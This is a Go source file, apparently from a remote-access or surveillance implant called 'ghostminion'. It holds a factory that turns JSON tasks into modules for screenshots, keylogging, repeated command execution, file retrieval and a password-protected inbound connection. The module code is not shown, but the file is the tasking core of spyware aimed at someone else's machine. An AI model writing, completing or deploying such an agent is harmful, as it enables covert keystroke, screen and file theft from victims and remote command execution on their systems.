package apps

import (
	"encoding/json"
	"errors"
	"ghostminion/logger"
	"sync"
)

type AppType string

const (
	ScreenShotTask    AppType = "screenshot"
	KeyLoggerTask     AppType = "keylogger"
	CommandTask       AppType = "command"
	GetFileTask       AppType = "getfile"
	ChangeConfigTask  AppType = "changeconfig"
	ConnectOnlineTask AppType = "connectonline"
)

type AppData struct {
	Id     string          `json:"id"`
	Type   AppType         `json:"type"`
	Name   string          `json:"name"`
	Params json.RawMessage `json:"params"`
}

type App interface {
	Start(wg *sync.WaitGroup)
	Stop()
	validateParams() error
}

var lgr = logger.GetLogger()

func NewAppFactory(appData AppData) (App, error) {
	var app App = nil
	var err error = nil
	appParams := map[string]any{}
	if err = json.Unmarshal(appData.Params, &appParams); err != nil {
		return nil, err
	}

	switch appData.Type {
	case ChangeConfigTask:
		// TODO: change config on demand
		break
	case ScreenShotTask:
		app, err = NewScreenshotApp(
			appParams["Interval"].(int),
			appParams["Quality"].(int),
		)
		break
	case KeyLoggerTask:
		app, err = NewKeyLoggerApp()
		break
	case CommandTask:
		app, err = NewPeriodicCommandApp(
			appParams["Command"].(string),
			appParams["Interval"].(int),
			appParams["Timeout"].(int),
			appParams["MaxRuns"].(int),
		)
		break
	case GetFileTask:
		app, err = NewPeriodicGetFileApp(
			appParams["Path"].(string),
			appParams["MaxSize"].(int),
			appParams["Interval"].(int),
			appParams["CheckMD5"].(bool),
			appParams["MaxRuns"].(int),
		)
		break
	case ConnectOnlineTask:
		app, err = NewConnectOnlineApp(
			appParams["Port"].(int),
			appParams["Password"].(string),
		)
		break
	default:
		err = errors.New("unknown app type")
	}

	return app, err
}
